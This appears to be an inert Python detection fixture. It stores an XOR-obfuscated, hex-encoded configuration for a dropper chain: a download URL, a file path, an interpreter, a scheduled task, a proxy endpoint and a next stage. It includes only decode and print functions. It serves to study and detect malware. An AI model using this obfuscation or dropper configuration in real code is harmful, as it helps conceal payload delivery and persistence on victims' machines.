#!/usr/bin/env python3
if True:
    # Huntress Script Triage -- inert static-analysis fixture (cpython3)
    import base64
    import io
    import os

    MATERIAL_ab7c8e76 = "fb:c6:f4:88:fb:8f:ea:9a:e9:d4:a4:d6:b9:df:b6:da:bf:e0:88:e7:94:e0:cc:ad:ce:bf:ca:a3:d1:b4:eb:99:fc:91:fe:8a:ef:c3:a7:c2:a1:ce:aa:cf:90:f5:98:fa:9f:fb:9f:fa:9e:b2:c5:b7:de:aa:cf:90:f6:9f:f3:96:ba:de:b7:c4:b4:d5:a1:c2:aa:f5:85:f7:98:fb:9e:ed:9e:e2:83:e7:86:f6:82:e7:95:a8:d8:b7:c0:a5:d7:a4:cc:a9:c5:a9:f6:86:ff:8b:e3:8c:e2:bd:d5:b4:da:be:d1:b7:d1:ad:de:aa:cb:ac:c9:96:f5:9a:ef:81:f5:c8:fd:81:f2:8b:e5:91:f0:88:b5:c2:a3:cf:bd:c8:bb:e4:86:ef:81:e5:8c:e2:85:f9:96:f4:92:e7:94:f7:96:e2:8b:e4:8a:b7:d2:aa:c9:ac:dc:a8:c1:ae:c0:9f:ed:82:f7:83:ea:84:e3:9f:fc:9d:ef:9d:f4:91:e3:de:ae:d7:e5:80:f8:9d:c2:b5:dc:b2:d6:b9:ce:bd:e2:91:f4:86:f0:99:fa:9f:e3:94:fd:93:f7:98:ef:9c:c3:a0:c8:a9:c0:ae:93:e0:85:f7:81:e8:8b:ee:b1:d5:b0:c3:a0:d2:bb:cb:bf:d0:a2:de:bd:dc:b1:c1:a0:c9:ae:c0:9f:f6:92:af:cc:ad:c0:b0:d1:b8:df:b1:9c:fe:cf:f8:cf:aa:cc:fa:ce:fb:c2:be:cb:b9:d5:e8:80:f4:80:f0:83:b9:96:b9:db:ea:dd:ea:8f:e9:df:eb:de:e7:c9:ac:d4:b5:d8:a8:c4:a1:8f:e6:88:fe:9f:f3:9a:fe:d1:e8:8e:ed:d5:e2:83:e7:d3:fd:8d:f4:88:fd:8e:eb:99:c6:a7:c0:a5:cb:bf:82:ca:bf:d1:a5:d7:b2:c1:b2:e2:9b:ef:87:e8:86:a9:cb:fa:cd:fa:9f:f9:cf:fb:ce:f7:8b:ed:84:e8:8d:d2:a2:c3:b7:df:e2:a1:9b:b4:e4:96:f9:9e:ec:8d:e0:a4:c5:b1:d0:ff:b7:c2:ac:d8:aa:cf:bc:cf:83:e2:80:af:81:f4:84:e0:81:f5:90:bd:df:ee:d9:ee:8b:ed:db:ef:da:e3:cd:bd:c4:b8:d1:bf:cb:ae:dc:ac:de:bb:cf:aa:d8:87:f7:96:e2:8a:b7:f4:ce:e1:b1:c3:ac:cb:b9:d8:b5:f1:90:e4:85:aa:fa:83:f7:9f:f0:9e:b3:d1:e0:d7:e0:85:e3:d5:e1:d4:ed:c2:b2:cb:bf:d7:b8:d6:f8:9d:e5:80:fc:88:e9:9a:f1:ae:c0:a1:cc:a9:94:c7:be:cd:b9:dc:b1:e4:94:f0:91:e5:80:ad:cf:fe:c9:fe:9b:fd:cb:ff:ca:f3:8f:ff:8d:e2:9a:e3:bc:d9:b7:d3:a3:cc:a5:cb:bf:82:b3:81:b6:98:a8:86:b6:98:a9:93:a2:97:a3:90:a1:dd:b3:d6:ae:da:85:f6:82:e3:84:e1:dc:ae:cb:b8:d7:a2:d0:b3:d6:fb:88:e9:84:f4:98:fd:d3:a3:d0:e1"
    CODEC_ab7c8e76 = "hex_colon|rolling_xor|8d"

    def load_ab7c8e76():
        return bytes.fromhex(MATERIAL_ab7c8e76.replace(":", " "))

    def decode_ab7c8e76(item1):
        item2 = bytearray()
        item5 = 141
        for value in item1:
            item2.append(value ^ item5)
            item5 = value
        return bytes(item2)

    def recover_ab7c8e76():
        item4 = "left" if 2 > 1 else "right"
        _pass = 0
        while _pass < 1:
            item2 = decode_ab7c8e76(load_ab7c8e76())
            _pass += 1
        item3 = item2.decode("ascii", "strict")
        return item3

    def inspect_ab7c8e76():
        view = memoryview(recover_ab7c8e76().encode("ascii"))
        return bytes(view).decode("ascii")

    def surface_ab7c8e76():
        return surface if (surface := ("walrus_binding", "exception_routing", "py2exe_windows_service", "service_descriptor")) else ()

    def obfuscation_ab7c8e76():
        try:
            {}["missing"]
        except KeyError:
            return "exception_routing"

    def plan_ab7c8e76():
        fields = dict(item.split("=", 1) for item in inspect_ab7c8e76().split("|"))
        analysis_surface = surface_ab7c8e76()
        obfuscation_surface = obfuscation_ab7c8e76()
        operation_plan = ("powershell_python_handoff", ("platform",), fields["url"], fields["file_path"], (fields["interpreter_path"], fields["file_path"]), fields["task_name"], fields["proxy_endpoint"], fields["next_stage"])
        return operation_plan + (analysis_surface, obfuscation_surface)

    if os.environ.get("HUNTRESS_INSPECT_ONLY") == "1":
        print(inspect_ab7c8e76())
